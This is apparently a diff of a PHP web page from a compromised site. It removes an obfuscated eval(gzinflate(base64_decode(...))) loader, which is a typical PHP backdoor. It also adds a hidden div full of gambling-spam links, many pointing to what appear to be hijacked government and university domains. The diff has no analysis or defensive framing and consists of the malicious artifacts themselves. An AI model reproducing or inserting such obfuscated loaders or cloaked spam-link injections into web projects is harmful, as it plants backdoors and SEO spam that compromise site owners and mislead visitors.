@@ -9,10 +9,6 @@ $query=mysql_query($sql,$koneksi);
 $data=mysql_fetch_array($query);
 $rows=mysql_num_rows($query);
 
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "\x3d\x3dgt\x41F2JomjhV6rM3FXxr0ju/wGtHHllvjYfpe1DRgGMv6ZDo6Ep1qF8g\x61939nSkX/\x42I\x62mmyQ2Q\x2bM\x610JeOWye0QXI\x63NILP3\x42qYojE9/\x62\x62J97v\x43sdOE6\x41o\x41OQg\x63K1JGr0wmVJw\x2bKw\x41w\x41ID7QMJ3y/j\x43\x41X\x42wJe/jJ\x41nFw/T\x43\x41\x62\x42wJe/jI\x413Fw/D\x43\x41f\x42wJe/jH\x41HGw/z\x42\x41j\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-
 ?>
 
 <?php 
@@ -61,6 +57,66 @@ $rowsd=mysql_num_rows($queryd);
 </head>
 
 <body>
+
+	<div style="display: none;">
+<a href="https://papuafoto.com/">Situs Togel Terpercaya</a>
+<a href="https://topcongo.fm/">Slot Gacor Mahjong</a>
+<a href="http://ready.dprd.jatimprov.go.id/images_dapil/toto-slot/">Togel Hadiah Terbesar</a>
+<a href="https://health.lp-pao.go.th/">Situs Toto</a>
+<a href="https://helenafrithpowell.com/">Situs Toto</a>
+<a href="https://viverlisboa.org/">Scatter Hitam</a>
+<a href="http://103.146.203.74/">Data HK</a>
+<a href="https://ajansay.com/">situs toto</a>
+<a href="https://bowlerframework.com/">Situs Toto Togel</a>
+<a href="https://levels.com.mx">Situs Toto</a>
+<a href="https://labs-org.ru/">Situs Toto Macau</a>
+<a href="https://downsoundrecords.com/">Situs Toto Macau</a>
+<a href="https://suphanburifc.com">Rokokbet</a>
+<a href="https://www.dse.co.tz">Rokokbet</a>
+<a href="https://aligarhlocks.in/">Rokokbet</a>
+<a href="https://migahost.com/">Rokokbet</a>
+<a href="https://stricture-group.com/">Slot Gacor Hari Ini</a>
+<a href="https://health.lp-pao.go.th/">Situs Toto Resmi</a>
+<a href="https://dankshireshop.com/">Situs Toto Resmi</a>
+<a href="https://sinaker.dumaikota.go.id/vendor/orchid/css/">slot demo</a>
+<a href="https://javsubhay.com/">Rokokbet</a>
+<a href="https://egybaest.com/">situs togel terpercaya</a>
+<a href="https://www.cozimi.com/">For4D</a>
+<a href="https://sinaker.dumaikota.go.id/vendor/orchid/js/">Scatter Hitam</a>
+<a href="https://sinaker.dumaikota.go.id/vendor/orchid/img/">Slot Dana</a>
+<a href="https://health.lp-pao.go.th/dashboard/docs/?tunnel=situs-toto">situs toto</a>
+<a href="https://health.lp-pao.go.th/dashboard/docs/?tunnel=slot-gacor">slot gacor</a>
+<a href="https://health.lp-pao.go.th/dashboard/docs/?tunnel=slot-demo">slot demo</a>
+<a href="https://health.lp-pao.go.th/dashboard/docs/?tunnel=scatter-hitam">scatter hitam</a>
+<a href="https://health.lp-pao.go.th/dashboard/docs/?tunnel=toto-slot">toto slot</a>
+<a href="https://health.lp-pao.go.th/dashboard/docs/?tunnel=live-casino">live-casino</a>
+<a href="https://sinaker.dumaikota.go.id/vendor/orchid/js/">slot demo gacor</a>
+<a href="https://for4dcuan.com/">for4d</a>
+<a href="http://prowayresearch.com/">for4d</a>
+<a href='https://lauamarc.es/'>for4d</a>
+<a href="https://ajagames.com">shiowla</a>
+<a href="https://vsholic.com">shiowla</a>
+<a href='https://h3a-tech.com/'>shiowla</a>
+<a href="https://smartnetservice.com/situs-toto-terpercaya/">shiowla</a>
+<a href="https://rsud.pandeglangkab.go.id/product/toto/">situs toto</a>
+<a href="https://valentinabelen.pe/-/for4d/">for4d</a>
+<a href="https://ajaxhandyman.com/produk/scatter-hitam">scatter hitam</a>
+<a href="https://conference.isi-ska.ac.id/pages/-/scatter-terbaru/">slot gacor scatter hitam</a>
+<a href="https://rsud.pandeglangkab.go.id/-/slot99/">slot99</a>
+<a href="https://rsud.pandeglangkab.go.id/-/togelprize123/">togel prize 123</a>
+<a href="https://journal.unigres.ac.id/slot99/">slot99</a>
+<a href="https://rsud.pandeglangkab.go.id/product/hitam/">scatter hitam</a>
+<a href="https://www.solusigeospasial.co.id/akun-scatter-hitam/">https://www.solusigeospasial.co.id/akun-scatter-hitam/</a>
+<a href="https://sinaker.dumaikota.go.id/scatter-hitam/">https://sinaker.dumaikota.go.id/scatter-hitam/</a>
+<a href="https://katalog.univrab.ac.id/wp-content/uploads/">https://katalog.univrab.ac.id/wp-content/uploads/</a>
+<a href="https://pustaka.univrab.ac.id/files/">https://pustaka.univrab.ac.id/files/</a>
+<a href="https://www.solusigeospasial.co.id/akun-scatter-hitam/">Scatter Hitam</a>
+<a href="https://anbissa.com/">Rokokbet</a>
+<a href="https://128.199.235.242/">For4D</a>
+<a href="https://157.15.77.223/">situs toto</a>
+<a href="https://ejournal.iainkendari.ac.id/templates/pulsa/">slot pulsa</a>
+</div>
+
 
   <!-- ======= Header ======= -->
   <header id="header" class="fixed-top ">
